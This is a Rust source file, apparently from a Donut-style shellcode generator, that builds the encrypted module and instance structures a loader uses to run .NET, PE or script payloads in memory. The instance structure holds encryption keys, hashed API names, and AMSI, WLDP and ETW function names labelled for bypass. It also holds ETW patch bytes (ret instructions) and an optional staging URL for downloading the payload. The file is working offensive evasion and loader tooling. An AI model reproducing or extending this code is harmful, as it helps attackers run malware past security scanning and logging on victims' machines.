//! Instance and module building

use anyhow::Result;
use midres_common::*;

use crate::config::Config;
use crate::pe::PeInfo;
use crate::random::RandomContext;
use crate::hash::maru_hash;

/// Build the module structure containing the payload
pub fn build_module(
    compressed_data: &[u8],
    pe_info: &PeInfo,
    config: &Config,
    random_ctx: &RandomContext,
) -> Result<Vec<u8>> {
    let mut module = Vec::new();
    
    // Module type (4 bytes)
    module.extend_from_slice(&(pe_info.module_type as u32).to_le_bytes());
    
    // Thread flag (4 bytes)
    module.extend_from_slice(&(config.thread as u32).to_le_bytes());
    
    // Compression type (4 bytes)
    module.extend_from_slice(&(config.compression as u32).to_le_bytes());
    
    // Runtime version (256 bytes)
    let runtime = config.runtime.as_deref()
        .or(pe_info.runtime_version.as_deref())
        .unwrap_or("v4.0.30319");
    let mut runtime_buf = [0u8; MAX_NAME_LEN];
    let runtime_bytes = runtime.as_bytes();
    runtime_buf[..runtime_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
        &runtime_bytes[..runtime_bytes.len().min(MAX_NAME_LEN - 1)]
    );
    module.extend_from_slice(&runtime_buf);
    
    // Domain name (256 bytes)
    let mut domain_buf = [0u8; MAX_NAME_LEN];
    let domain_bytes = random_ctx.domain_name().as_bytes();
    domain_buf[..domain_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
        &domain_bytes[..domain_bytes.len().min(MAX_NAME_LEN - 1)]
    );
    module.extend_from_slice(&domain_buf);
    
    // Class name (256 bytes)
    let mut class_buf = [0u8; MAX_NAME_LEN];
    let class_bytes = config.class_name.as_deref()
        .unwrap_or(random_ctx.class_name()).as_bytes();
    class_buf[..class_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
        &class_bytes[..class_bytes.len().min(MAX_NAME_LEN - 1)]
    );
    module.extend_from_slice(&class_buf);
    
    // Method name (256 bytes)
    let mut method_buf = [0u8; MAX_NAME_LEN];
    let method_bytes = config.method_name.as_deref()
        .unwrap_or(random_ctx.method_name()).as_bytes();
    method_buf[..method_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
        &method_bytes[..method_bytes.len().min(MAX_NAME_LEN - 1)]
    );
    module.extend_from_slice(&method_buf);
    
    // Arguments (256 bytes)
    let mut args_buf = [0u8; MAX_NAME_LEN];
    if let Some(ref args) = config.args {
        let args_bytes = args.as_bytes();
        args_buf[..args_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
            &args_bytes[..args_bytes.len().min(MAX_NAME_LEN - 1)]
        );
    }
    module.extend_from_slice(&args_buf);
    
    // Unicode flag (4 bytes)
    module.extend_from_slice(&0u32.to_le_bytes());
    
    // Signature (16 bytes)
    module.extend_from_slice(random_ctx.signature());
    
    // MAC - hash of signature for verification (8 bytes)
    let mac = maru_hash(random_ctx.signature(), random_ctx.hash_iv());
    module.extend_from_slice(&mac.to_le_bytes());
    
    // Compressed length (4 bytes)
    module.extend_from_slice(&(compressed_data.len() as u32).to_le_bytes());
    
    // Original length - need to track this separately (4 bytes)
    // For now, use 0 as placeholder - would come from original data
    module.extend_from_slice(&0u32.to_le_bytes());
    
    // Payload data
    module.extend_from_slice(compressed_data);
    
    // Align to 16 bytes
    while module.len() % 16 != 0 {
        module.push(0);
    }
    
    Ok(module)
}

/// Build the instance structure containing loader configuration
pub fn build_instance(
    encrypted_module: &[u8],
    api_hashes: &[u64],
    pe_info: &PeInfo,
    config: &Config,
    random_ctx: &RandomContext,
) -> Result<Vec<u8>> {
    let mut instance = Vec::new();
    
    // Total length placeholder - will be updated at the end (4 bytes)
    instance.extend_from_slice(&0u32.to_le_bytes());
    
    // Crypto keys structure
    // Master key (32 bytes)
    instance.extend_from_slice(&random_ctx.instance_key().key);
    // Nonce (12 bytes)
    instance.extend_from_slice(&random_ctx.instance_key().nonce);
    // Counter (4 bytes)
    instance.extend_from_slice(&0u32.to_le_bytes());
    
    // Hash IV (8 bytes)
    instance.extend_from_slice(&random_ctx.hash_iv().to_le_bytes());
    
    // API hashes (up to MAX_API_COUNT * 8 bytes)
    let mut api_hash_buf = [0u64; MAX_API_COUNT];
    for (i, &hash) in api_hashes.iter().enumerate().take(MAX_API_COUNT) {
        api_hash_buf[i] = hash;
    }
    for hash in api_hash_buf.iter() {
        instance.extend_from_slice(&hash.to_le_bytes());
    }
    
    // Exit option (4 bytes)
    instance.extend_from_slice(&(config.exit_opt as u32).to_le_bytes());
    
    // Entropy level (4 bytes)
    instance.extend_from_slice(&(config.entropy as u32).to_le_bytes());
    
    // Original entry point (4 bytes)
    instance.extend_from_slice(&pe_info.entry_point.to_le_bytes());
    
    // === ENCRYPTED PORTION STARTS HERE ===
    
    // API count (4 bytes)
    instance.extend_from_slice(&(api_hashes.len() as u32).to_le_bytes());
    
    // DLL names (256 bytes) - semicolon separated
    let dll_names = get_required_dlls(pe_info);
    let dll_string = dll_names.join(";");
    let mut dll_buf = [0u8; MAX_NAME_LEN];
    let dll_bytes = dll_string.as_bytes();
    dll_buf[..dll_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
        &dll_bytes[..dll_bytes.len().min(MAX_NAME_LEN - 1)]
    );
    instance.extend_from_slice(&dll_buf);
    
    // String constants for bypass (various sizes)
    // dataname - ".data" (8 bytes)
    let mut dataname = [0u8; 8];
    dataname[..6].copy_from_slice(b".data\0");
    instance.extend_from_slice(&dataname);
    
    // kernelbase (12 bytes)
    let mut kernelbase = [0u8; 12];
    kernelbase[..11].copy_from_slice(b"kernelbase\0");
    instance.extend_from_slice(&kernelbase);
    
    // amsi (8 bytes)
    let mut amsi = [0u8; 8];
    amsi[..5].copy_from_slice(b"amsi\0");
    instance.extend_from_slice(&amsi);
    
    // clr (4 bytes)
    let mut clr = [0u8; 4];
    clr[..4].copy_from_slice(b"clr\0");
    instance.extend_from_slice(&clr);
    
    // wldp (8 bytes)
    let mut wldp = [0u8; 8];
    wldp[..5].copy_from_slice(b"wldp\0");
    instance.extend_from_slice(&wldp);
    
    // ntdll (8 bytes)
    let mut ntdll = [0u8; 8];
    ntdll[..6].copy_from_slice(b"ntdll\0");
    instance.extend_from_slice(&ntdll);
    
    // Command line symbols (256 bytes)
    let mut cmd_syms = [0u8; MAX_NAME_LEN];
    cmd_syms[..13].copy_from_slice(b"__p__argc\0\0\0\0");
    instance.extend_from_slice(&cmd_syms);
    
    // Exit API names (256 bytes)
    let mut exit_api = [0u8; MAX_NAME_LEN];
    exit_api[..5].copy_from_slice(b"exit\0");
    instance.extend_from_slice(&exit_api);
    
    // Bypass level (4 bytes)
    instance.extend_from_slice(&(config.bypass as u32).to_le_bytes());
    
    // Headers option (4 bytes)
    instance.extend_from_slice(&(config.headers as u32).to_le_bytes());
    
    // Bypass function names
    // WldpQueryDynamicCodeTrust (32 bytes)
    let mut wldp_query = [0u8; 32];
    wldp_query[..25].copy_from_slice(b"WldpQueryDynamicCodeTrust");
    instance.extend_from_slice(&wldp_query);
    
    // WldpIsClassInApprovedList (32 bytes)
    let mut wldp_approved = [0u8; 32];
    wldp_approved[..25].copy_from_slice(b"WldpIsClassInApprovedList");
    instance.extend_from_slice(&wldp_approved);
    
    // AmsiInitialize (16 bytes)
    let mut amsi_init = [0u8; 16];
    amsi_init[..14].copy_from_slice(b"AmsiInitialize");
    instance.extend_from_slice(&amsi_init);
    
    // AmsiScanBuffer (16 bytes)
    let mut amsi_scan_buf = [0u8; 16];
    amsi_scan_buf[..14].copy_from_slice(b"AmsiScanBuffer");
    instance.extend_from_slice(&amsi_scan_buf);
    
    // AmsiScanString (16 bytes)
    let mut amsi_scan_str = [0u8; 16];
    amsi_scan_str[..14].copy_from_slice(b"AmsiScanString");
    instance.extend_from_slice(&amsi_scan_str);
    
    // EtwEventWrite (16 bytes)
    let mut etw_write = [0u8; 16];
    etw_write[..13].copy_from_slice(b"EtwEventWrite");
    instance.extend_from_slice(&etw_write);
    
    // EtwEventUnregister (20 bytes)
    let mut etw_unreg = [0u8; 20];
    etw_unreg[..18].copy_from_slice(b"EtwEventUnregister");
    instance.extend_from_slice(&etw_unreg);
    
    // ETW bypass bytes
    // x64: ret (1 byte, padded to 4)
    instance.extend_from_slice(&[0xC3, 0x00, 0x00, 0x00]);
    // x86: ret 14h (4 bytes)
    instance.extend_from_slice(&[0xC2, 0x14, 0x00, 0x00]);
    
    // WScript strings (8 bytes each)
    let mut wscript = [0u8; 8];
    wscript[..7].copy_from_slice(b"WScript");
    instance.extend_from_slice(&wscript);
    
    let mut wscript_exe = [0u8; 12];
    wscript_exe[..11].copy_from_slice(b"wscript.exe");
    instance.extend_from_slice(&wscript_exe);
    
    // Decoy path (512 bytes)
    let decoy_path = [0u8; 512];
    instance.extend_from_slice(&decoy_path);
    
    // GUIDs for COM interfaces
    write_guid(&mut instance, &guids::IID_IUNKNOWN);
    write_guid(&mut instance, &guids::IID_IDISPATCH);
    write_guid(&mut instance, &guids::CLSID_CLRMETAHOST);
    write_guid(&mut instance, &guids::IID_ICLRMETAHOST);
    write_guid(&mut instance, &guids::IID_ICLRRUNTIMEINFO);
    write_guid(&mut instance, &guids::CLSID_CORRUNTIMEHOST);
    write_guid(&mut instance, &guids::IID_ICORRUNTIMEHOST);
    write_guid(&mut instance, &guids::IID_APPDOMAIN);
    
    // Script GUIDs (placeholder for VBS/JS)
    for _ in 0..6 {
        write_guid(&mut instance, &Guid::default());
    }
    
    // Instance type (4 bytes)
    let instance_type = if config.is_staged() {
        InstanceType::Http
    } else {
        InstanceType::Embedded
    };
    instance.extend_from_slice(&(instance_type as u32).to_le_bytes());
    
    // Server URL (256 bytes)
    let mut server_buf = [0u8; MAX_NAME_LEN];
    if let Some(ref url) = config.url {
        let url_bytes = url.as_bytes();
        server_buf[..url_bytes.len().min(MAX_NAME_LEN - 1)].copy_from_slice(
            &url_bytes[..url_bytes.len().min(MAX_NAME_LEN - 1)]
        );
    }
    instance.extend_from_slice(&server_buf);
    
    // Username (256 bytes)
    instance.extend_from_slice(&[0u8; MAX_NAME_LEN]);
    
    // Password (256 bytes)
    instance.extend_from_slice(&[0u8; MAX_NAME_LEN]);
    
    // HTTP request type (8 bytes)
    let mut http_req = [0u8; 8];
    http_req[..3].copy_from_slice(b"GET");
    instance.extend_from_slice(&http_req);
    
    // Signature for verification (256 bytes)
    let mut sig_buf = [0u8; MAX_NAME_LEN];
    sig_buf[..SIG_LEN].copy_from_slice(random_ctx.signature());
    instance.extend_from_slice(&sig_buf);
    
    // MAC for verification (8 bytes)
    let mac = maru_hash(random_ctx.signature(), random_ctx.hash_iv());
    instance.extend_from_slice(&mac.to_le_bytes());
    
    // Module crypto keys
    // Master key (32 bytes)
    instance.extend_from_slice(&random_ctx.module_key().key);
    // Nonce (12 bytes)
    instance.extend_from_slice(&random_ctx.module_key().nonce);
    // Counter (4 bytes)
    instance.extend_from_slice(&0u32.to_le_bytes());
    
    // Module length (8 bytes)
    instance.extend_from_slice(&(encrypted_module.len() as u64).to_le_bytes());
    
    // Embedded module data (for EMBEDDED type)
    if instance_type == InstanceType::Embedded {
        instance.extend_from_slice(encrypted_module);
    }
    
    // Update total length at the beginning
    let total_len = instance.len() as u32;
    instance[0..4].copy_from_slice(&total_len.to_le_bytes());
    
    // Align to 16 bytes
    while instance.len() % 16 != 0 {
        instance.push(0);
    }
    
    Ok(instance)
}

fn write_guid(buf: &mut Vec<u8>, guid: &Guid) {
    buf.extend_from_slice(&guid.data1.to_le_bytes());
    buf.extend_from_slice(&guid.data2.to_le_bytes());
    buf.extend_from_slice(&guid.data3.to_le_bytes());
    buf.extend_from_slice(&guid.data4);
}

fn get_required_dlls(pe_info: &PeInfo) -> Vec<&'static str> {
    let mut dlls = vec!["ole32", "oleaut32", "wininet", "mscoree", "shell32"];
    
    if pe_info.is_dotnet {
        // Add .NET specific DLLs if not already present
    }
    
    dlls
}
